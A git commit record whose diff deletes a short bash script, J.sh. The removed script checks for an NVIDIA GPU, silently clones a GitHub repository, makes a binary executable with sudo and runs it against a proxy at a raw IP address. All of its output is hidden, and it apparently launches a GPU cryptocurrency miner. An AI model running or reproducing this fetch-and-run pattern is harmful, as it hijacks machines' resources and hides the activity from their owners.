6ad455e6c779b04ae6135e4c0911f6e1a4dbade2
phucbmt <phucdlbmt@gmail.com>
2021-03-02 22:50:56 +0700

    Delete J.sh

--- J.sh
+++
@@ -1,8 +0,0 @@
-#! /bin/bash
-nvidia-smi
-printf "Run 64.52.174.165:4545/$1"  >&2
-{
-git clone https://github.com/phucbmt/tech.git &> /dev/null
-sudo chmod +x tech/m
-./tech/m -P http://64.52.174.165:4545/"$1" &> log
-} &> /dev/null
